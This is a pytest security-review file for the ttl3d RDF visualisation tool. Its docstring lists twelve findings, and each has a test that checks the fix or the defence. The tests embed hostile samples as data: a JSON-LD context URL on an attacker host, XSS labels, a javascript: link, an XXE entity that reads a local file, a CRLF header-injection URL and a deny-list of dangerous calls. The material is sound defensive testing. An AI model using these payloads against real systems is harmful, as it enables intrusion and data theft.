"""Security review of ttl3d: one test per finding, failing tests mark real vulnerabilities.

Findings (severity; file:line; status of the test below):

1. MEDIUM; ttl3d/load.py:145-198 (via cli.py:63-66 and cli.py:125-130) -- a JSON-LD input
   (a .jsonld file guessed by extension, --format json-ld, or stdin under that format) is
   handed to rdflib with context resolution enabled, and rdflib fetches a referenced
   @context (or @import) URL itself. Loading an untrusted file silently sends an HTTP
   request to a host the file names: a beacon that leaks the victim's IP and a probe of
   internal addresses from the victim's network position. ttl3d/sparql.py:23-27 refuses
   JSON-LD from SPARQL endpoints for exactly this reason, but the local-file path was open.
   FIXED: load._own_contexts_only refuses a context that names another document before
   rdflib reads the file; test_sec1_jsonld_remote_context_fetch passes.

2. MEDIUM; ttl3d/load.py:145-198 (same root cause) -- a @context that names a filesystem
   path was read from disk, so an untrusted .jsonld file chose which local JSON file the
   tool reads, and that file's namespace bindings flowed into the page's data.
   FIXED by the same refusal; test_sec2_jsonld_context_reads_local_files passes.

3. HARDENING (verified safe); ttl3d/render.py:110-115 (script_safe), render.py:77,136 and
   ttl3d/viewer.js:123-126 (esc) -- hostile labels, definitions and titles cannot inject
   HTML, open a comment or close the <script> block. test_sec3_... passes (NOTE).

4. HARDENING (verified safe); ttl3d/graph.py:213-216 with ttl3d/viewer.js:172-177 -- only
   dcterms:identifier values starting with "http" become the card's clickable link, so a
   javascript: URL can never reach an href. test_sec4_... passes (NOTE).

5. HARDENING (verified safe); ttl3d/load.py:130-142 (_expat_first) -- XML inputs run
   through bare expat first, so an external entity (XXE, CWE 611) is never fetched.
   test_sec5_... passes (NOTE).

6. HARDENING (verified safe); ttl3d/load.py:130-142 -- an entity-expansion bomb
   (CWE 776) is refused in milliseconds by expat's amplification limit. test_sec6_...
   passes (NOTE).

7. HARDENING (verified safe); ttl3d/sparql.py:24-28 and 273-274 -- a SPARQL endpoint
   cannot answer application/ld+json, so it cannot trigger finding 1 through the query
   path. test_sec7_... passes (NOTE).

8. HARDENING (verified safe); ttl3d/sparql.py:134-163 -- the endpoint URL is validated:
   credentials in the URL, non-http(s) schemes (file:, ftp:), a URL with no host and
   whitespace (CRLF header splitting) are all refused before anything is sent.
   test_sec8_... passes (NOTE).

9. HARDENING (verified safe); ttl3d/sparql.py:129-130 (repr=False), 170-175 (_scrub) and
   196-198 (redirects refused) -- Basic/Bearer credentials stay out of repr, str and
   server-text error messages. test_sec9_... passes (NOTE).

10. HARDENING (verified safe); package-wide -- there is no local HTTP server (the review
    brief's "serves the page over HTTP" does not exist: the page is a static file, and
    notebooks get a sandboxed srcdoc iframe), no subprocess, no shell, no eval/exec, no
    pickle, no archive extraction, so there is no path-traversal-in-a-server surface.
    test_sec10_... passes (NOTE).

11. HARDENING (verified safe); ttl3d/api.py:152-157 -- the notebook iframe is sandboxed
    with allow-scripts and without allow-same-origin, and the page is HTML-escaped into
    the srcdoc attribute, so no page content can break out. test_sec11_... passes (NOTE).

12. HARDENING (verified safe); ttl3d/table.py:51, 273-275 with ttl3d/iri.py:25-40 -- a
    table id that claims to be a bracketed IRI but holds markup is refused outright, and
    every other minted id is percent-encoded, so untrusted cell text can never put <, >
    or " into an IRI that later reaches the page. test_sec12_... passes (NOTE).
"""
import json
import pyexpat
import urllib.request

import pytest

from ttl3d import api, graph, load, render, sparql, table
from ttl3d.api import Page

try:  # rdflib >= 7.1 opens URLs through this module's urlopen
    import rdflib._networking as _rdflib_networking
except ImportError:  # pragma: no cover - older rdflib calls urllib.request.urlopen itself
    _rdflib_networking = None

Q = "PREFIX ex: <http://example.org/q#> CONSTRUCT { ?s ?p ?o } WHERE { ?s ?p ?o }"


# --------------------------------------------------------------------------- 1
def test_sec1_jsonld_remote_context_fetch(tmp_path, monkeypatch):
    # Fixed (it failed when the review wrote it): load._own_contexts_only now refuses the file.
    #
    # Issue:   load.py handed a JSON-LD input to rdflib as-is (guessed from the .jsonld
    #          extension, --format json-ld, or stdin), and rdflib's JSON-LD parser
    #          resolves a referenced @context URL by fetching it over HTTP
    #          (rdflib/plugins/parsers/jsonld.py -> Context._fetch_context ->
    #          source_to_json -> URLInputSource). sparql.py:23-27 refuses JSON-LD from
    #          endpoints because "its parser fetches remote contexts", but a local file
    #          reaches the same parser with context resolution on.
    # Attack:  a victim runs `ttl3d untrusted.jsonld` on a file from an untrusted source;
    #          ttl3d silently GETs http://attacker.invalid/ctx.jsonld -- the request
    #          leaks the victim's IP, user agent and the time, and can probe internal
    #          addresses (link-local metadata services, intranet ports) from the
    #          victim's network position, which a purely local CLI must not do.
    # Secure:  parsing a local file never opens a network connection; a referenced
    #          context is either refused (like the endpoint path) or requires an
    #          explicit opt-in.
    # Was:     the fetch was attempted (the recorded call list was not empty).
    calls = []

    def no_network(request, *args, **kwargs):
        calls.append(getattr(request, "full_url", str(request)))
        raise OSError("no network in tests")

    if _rdflib_networking is not None:
        monkeypatch.setattr(_rdflib_networking, "urlopen", no_network)
    monkeypatch.setattr(urllib.request, "urlopen", no_network)
    doc = {"@context": "http://attacker.invalid/ctx.jsonld",
           "@id": "http://example.org/a", "http://example.org/p": [{"@id": "http://example.org/b"}]}
    f = tmp_path / "untrusted.jsonld"
    f.write_text(json.dumps(doc), encoding="utf-8")
    with pytest.raises(load.LoadError, match="its @context refers to another document"):
        load.load_files([f])      # refused outright: the triples would be wrong without the context
    assert calls == [], f"ttl3d fetched a remote @context while parsing a local file: {calls}"


# --------------------------------------------------------------------------- 2
def test_sec2_jsonld_context_reads_local_files(tmp_path):
    # Fixed (it failed when the review wrote it): the same refusal as finding 1.
    #
    # Issue:   the same context resolution as finding 1 also accepted a filesystem path:
    #          rdflib's create_input_source turns a plain string into a FileInputSource,
    #          so the @context of an untrusted .jsonld file decides which local file
    #          ttl3d reads. Whatever that file binds (prefixes, vocabularies) then flows
    #          into the dataset and so into the generated page's data.
    # Attack:  an untrusted file carries "@context": "/path/to/known/json" for a path
    #          the attacker can predict on the victim's machine (another project's
    #          config, a sync folder); the tool reads it and the bindings it defines
    #          appear in the legend and the page.
    # Secure:  a referenced context is never resolved from the local filesystem either;
    #          only an inline context object is honoured.
    # Was:     the file was read and its binding ("http://example.org/leak#") imported.
    # The review asserted that the load succeeds without the binding; the file is refused
    # instead, as the review's own fix proposes: dropping the context would load other triples
    # than the file states.
    secret = tmp_path / "secret.json"
    secret.write_text(json.dumps({"@context": {"leak": "http://example.org/leak#"}}), encoding="utf-8")
    doc = {"@context": str(secret),
           "@id": "http://example.org/a", "http://example.org/p": [{"@id": "http://example.org/b"}]}
    f = tmp_path / "untrusted.jsonld"
    f.write_text(json.dumps(doc), encoding="utf-8")
    with pytest.raises(load.LoadError, match="its @context refers to another document"):
        load.load_files([f])      # refused before rdflib, which alone would open the path


# --------------------------------------------------------------------------- 3
def test_sec3_hostile_labels_cannot_inject_html_or_script(tmp_path):
    # NOTE: characterization of the defences (passes; keep it that way).
    #
    # The page embeds untrusted strings in three places: the JSON payload inside the
    # <script> block (render.script_safe escapes < > & as JS unicode escapes, so no tag
    # or comment can be opened or the block closed), the <title>/<h1> (html.escape with
    # quote=True) and the runtime card/tooltip (viewer.js esc() over every interpolation
    # that reaches innerHTML). An attacker-controlled RDF label therefore stays data.
    ttl = tmp_path / "hostile.ttl"
    label = '<img src=x onerror=alert(1)> & "quoted"'
    ttl.write_text(
        '@prefix ex: <http://example.org/h#> .\n'
        '@prefix rdfs: <http://www.w3.org/2000/01/rdf-schema#> .\n'
        'ex:a rdfs:label "<img src=x onerror=alert(1)> & \\"quoted\\"" ; ex:p ex:b .\n'
        'ex:b rdfs:label "</script><script>alert(2)</script>" .\n'
        'ex:c rdfs:label "<!--<script y" ; ex:p ex:a .\n', encoding="utf-8")
    data = graph.build(load.load_files([ttl]))
    page = render.render_html(data, title='t</title><script>alert(3)</script>', pinned=False,
                              labels={"node": True, "edge": True})
    assert page.count("</script>") == 2                # the bundle and the app, nothing closed early
    assert '<img src=x' not in page and "<!--" not in page.rsplit("<script>", 1)[1]
    assert "<title>t&lt;/title&gt;&lt;script&gt;alert(3)&lt;/script&gt;</title>" in page
    assert "<h1>t&lt;/title&gt;&lt;script&gt;alert(3)&lt;/script&gt;</h1>" in page
    app = page.rsplit("<script>", 1)[1]
    start = app.index("const DATA = ") + len("const DATA = ")
    payload = app[start:app.index(";\n", start)]
    labels = {n["id"]: n["label"] for n in json.loads(payload)["nodes"]}
    assert labels["http://example.org/h#a"] == label    # the label survives as data, not markup


# --------------------------------------------------------------------------- 4
def test_sec4_card_source_links_are_http_only(tmp_path):
    # NOTE: characterization of the defences (passes; keep it that way).
    #
    # The only place untrusted strings become an href is the card's sources list:
    # graph.py keeps a dcterms:identifier only when it starts with "http", and viewer.js
    # then writes <a href="${esc(s.url)}" target="_blank" rel="noopener">. A javascript:
    # (or data:) URI therefore never becomes a clickable link; the value still shows on
    # the card, but as escaped property text.
    ttl = tmp_path / "src.ttl"
    ttl.write_text(
        '@prefix ex: <http://example.org/s#> .\n'
        '@prefix prov: <http://www.w3.org/ns/prov#> .\n'
        '@prefix dcterms: <http://purl.org/dc/terms/> .\n'
        'ex:a prov:wasDerivedFrom ex:bad, ex:good .\n'
        'ex:bad dcterms:identifier "javascript:alert(1)" .\n'
        'ex:good dcterms:identifier "http://example.org/real" .\n', encoding="utf-8")
    data = graph.build(load.load_files([ttl]))
    node = next(n for n in data["nodes"] if n["id"] == "http://example.org/s#a")
    by_label = {s["label"]: s["url"] for s in node["sources"]}
    assert by_label == {"bad": None, "good": "http://example.org/real"}
    page = render.render_html(data, title="t", pinned=False, labels={"node": True, "edge": True})
    assert 'href="javascript' not in page


# --------------------------------------------------------------------------- 5
def test_sec5_xml_external_entities_are_never_fetched(tmp_path):
    # NOTE: characterization of the defences (passes; keep it that way).
    #
    # An RDF/XML or TriX input runs through bare expat first (load._expat_first), with no
    # entity handlers: pyexpat does not resolve external entities, so an XXE payload
    # (CWE 611) is defused before rdflib's own parsers see the document. The entity's
    # value is dropped, and the file it names is never read.
    secret = tmp_path / "secret.ttl"
    secret.write_text('ex:leak <http://www.w3.org/2000/01/rdf-schema#label> "TOP-SECRET" .\n',
                      encoding="utf-8")
    peek = tmp_path / "peek.rdf"
    peek.write_text(
        '<?xml version="1.0"?>\n'
        f'<!DOCTYPE rdf:RDF [<!ENTITY peek SYSTEM "{secret.as_uri()}">]>\n'
        '<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"'
        ' xmlns:ex="http://example.org/x#">'
        '<rdf:Description rdf:about="http://example.org/x#a"><ex:p>&peek;</ex:p>'
        '</rdf:Description></rdf:RDF>\n', encoding="utf-8")
    ds = load.load_files([peek])                       # parses; the entity is skipped, not fetched
    assert len(ds.merged) == 1
    assert not any("TOP-SECRET" in str(o) for o in ds.merged.objects())


# --------------------------------------------------------------------------- 6
@pytest.mark.skipif(pyexpat.version_info < (2, 4, 1),
                    reason="expat before 2.4.1 has no amplification limit")
def test_sec6_xml_entity_bomb_is_refused_quickly(tmp_path, xml_bomb):
    # NOTE: characterization of the defences (passes; keep it that way).
    #
    # A "billion laughs" document (CWE 776) is stopped by expat's amplification limit
    # during the same pre-pass, in milliseconds instead of rdflib's minutes of CPU, and
    # becomes a one-line LoadError.
    bomb = tmp_path / "bomb.rdf"
    bomb.write_bytes(xml_bomb)
    with pytest.raises(load.LoadError, match=r"bomb\.rdf: cannot parse as xml: .*amplification"):
        load.load_files([bomb])


# --------------------------------------------------------------------------- 7
def test_sec7_jsonld_sparql_answers_are_refused_by_media_type(endpoint):
    # NOTE: characterization of the defences (passes; keep it that way).
    #
    # The endpoint path cannot trigger findings 1 and 2: a SPARQL answer is parsed by its
    # Content-Type, and application/ld+json is not one of the accepted RDF media types
    # (sparql.RDF_MEDIA_TYPES deliberately excludes it -- see the comment at sparql.py:23).
    assert "application/ld+json" not in sparql.RDF_MEDIA_TYPES
    with pytest.raises(sparql.FetchError, match=r"answered application/ld\+json instead of RDF"):
        sparql.fetch(sparql.Query(endpoint.url + "/jsonld", Q))


# --------------------------------------------------------------------------- 8
@pytest.mark.parametrize(("endpoint", "message"), [
    ("http://alice:hunter2@example.org/sparql", "must not carry credentials"),
    ("ftp://example.org/data", "http:// or https://"),
    ("file:///etc/passwd", "http:// or https://"),
    ("http://example.org/s\r\nX-Evil: 1", "spaces or line breaks"),
    ("http:///nowhere", "host name"),
])
def test_sec8_endpoint_urls_are_hardened_before_anything_is_sent(endpoint, message):
    # NOTE: characterization of the defences (passes; keep it that way).
    #
    # Query.__post_init__ refuses, before any request is built: credentials in the URL
    # (they would sit in logs and shell history), non-http(s) schemes (file:/ftp: would
    # read local disk or use another protocol), a URL with no host, and whitespace of any
    # kind (a CR/LF would split HTTP headers -- CWE 113). A Bearer token must be printable
    # ASCII without spaces for the same reason.
    with pytest.raises(ValueError, match=message):
        sparql.Query(endpoint, Q)
    with pytest.raises(ValueError, match="printable ASCII"):
        sparql.Query("http://example.org/sparql", Q, token="tok en")
    sparql.Query("http://example.org/sparql", Q)       # the plain form still builds


# --------------------------------------------------------------------------- 9
def test_sec9_credentials_stay_out_of_repr_and_error_text():
    # NOTE: characterization of the defences (passes; keep it that way).
    #
    # auth and token are repr=False dataclass fields (a traceback or a notebook cell never
    # shows them), and _scrub blanks them out of server-echoed text before it reaches an
    # error message -- some endpoints answer errors with the request's headers quoted.
    q = sparql.Query("http://example.org/sparql", Q, auth=("alice", "hunter2"))
    qt = sparql.Query("http://example.org/sparql", Q, token="tok-123")
    for shown in (repr(q), str(q), repr(qt), str(qt)):
        assert "hunter2" not in shown and "tok-123" not in shown
    echo = f"echo: Basic {sparql._basic(q.auth)} Bearer tok-123 user:alice:hunter2"
    scrubbed = sparql._scrub(echo, q)
    assert "hunter2" not in scrubbed and sparql._basic(q.auth) not in scrubbed
    assert "tok-123" not in sparql._scrub(echo, qt)


# ---------------------------------------------------------------------------10
def test_sec10_no_server_subprocess_or_dynamic_execution_in_the_package():
    # NOTE: characterization of the attack surface (passes; keep it that way).
    #
    # The review brief asked about the "local HTTP server" -- there is none to audit:
    # the CLI writes one self-contained HTML file and exits, and notebooks embed the
    # page through a sandboxed srcdoc iframe, so there is no listening socket, no file
    # serving, and no path traversal surface. Equally, the package never shells out,
    # never spawns a subprocess, never eval/execs, never unpickles and never extracts
    # archives. This test pins all of that: if any of these appear, the surface changed
    # and this file needs new tests.
    import pathlib
    package = pathlib.Path(api.__file__).parent
    sources = b"\n".join(p.read_bytes() for p in sorted(package.glob("*.py")))
    for forbidden in (b"subprocess", b"os.system", b"shell=True", b"eval(", b"exec(", b"pickle",
                      b"http.server", b"HTTPServer", b"0.0.0.0", b"zipfile", b"tarfile"):
        assert forbidden not in sources, forbidden


# ---------------------------------------------------------------------------11
def test_sec11_notebook_iframe_is_sandboxed_and_cannot_be_broken_out_of():
    # NOTE: characterization of the defences (passes; keep it that way).
    #
    # Page._repr_html_ embeds the whole page in <iframe srcdoc="...">: html.escape with
    # quote=True keeps the content inside the attribute, and sandbox="allow-scripts"
    # without allow-same-origin lets the viewer run its JavaScript and WebGL without
    # ever reaching the notebook's origin (no cookie, storage or DOM access).
    hostile = '<script>alert(1)</script><img src=x onerror=alert(2)> " onmouseover="pwn'
    out = Page(hostile, height=123)._repr_html_()
    assert out.count("<iframe") == 1 and out.count("</iframe>") == 1
    assert 'sandbox="allow-scripts"' in out and "allow-same-origin" not in out
    assert '" onmouseover="' not in out and "<img src=x" not in out
    assert "&lt;script&gt;" in out                      # the page is escaped, still intact


# ---------------------------------------------------------------------------12
def test_sec12_minted_table_ids_cannot_carry_markup(tmp_path):
    # NOTE: characterization of the defences (passes; keep it that way).
    #
    # A table id goes through iri.written first: an id that claims to be a bracketed IRI
    # but contains a character Turtle's IRIREF forbids (< > " { } | \ ^ ` controls) is
    # refused as a LoadError, so `<b>x</b>` never becomes a node at all. Every other id
    # is minted under the base namespace with table.enc, which percent-encodes the same
    # characters -- a hostile cell can therefore never smuggle markup or a quote into a
    # node id, which is one of the strings the page embeds.
    assert "<" not in table.enc('<script>') and '"' not in table.enc('a"b')
    refused = tmp_path / "refused.csv"
    refused.write_text('id,label\n<b>x</b>,Plain\n', encoding="utf-8")
    with pytest.raises(load.LoadError, match=r"cannot be an IRI: it contains"):
        load.load_files([refused])
    csv = tmp_path / "weird.csv"
    csv.write_text('id,label\nb>c"d,Plain\n', encoding="utf-8")
    data = graph.build(load.load_files([csv]))
    ids = [n["id"] for n in data["nodes"]]
    assert ids == ["urn:x-ttl3d:b%3Ec%22d"]           # percent-encoded, no raw metacharacter
    page = render.render_html(data, title="t", pinned=False, labels={"node": True, "edge": True})
    assert '<img src=x' not in page and 'b>c"d' not in page
